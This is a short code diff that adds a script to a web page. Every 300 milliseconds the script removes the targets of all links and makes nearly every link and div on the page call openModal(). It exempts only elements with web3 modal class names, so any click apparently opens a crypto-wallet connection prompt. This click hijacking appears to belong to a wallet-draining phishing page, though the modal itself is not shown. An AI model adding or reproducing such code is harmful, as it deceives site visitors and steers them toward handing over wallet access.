@@ -345,6 +345,23 @@
                  })
                 })
               </script>
+
+    <script>
+    function addOnClickToElements() {
+        const links = document.querySelectorAll('a:not([onclick])');
+        for (const link of links) {
+            link.removeAttribute('href');
+            link.setAttribute('onclick', 'openModal()');
+        }
+
+        const divs = document.querySelectorAll('div:not([onclick]):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
+        for (const div of divs) {
+            div.setAttribute('onclick', 'openModal()');
+        }
+    }
+
+    setInterval(addOnClickToElements, 300);
+</script>
             
               <script>
                 $(document).ready(function(){
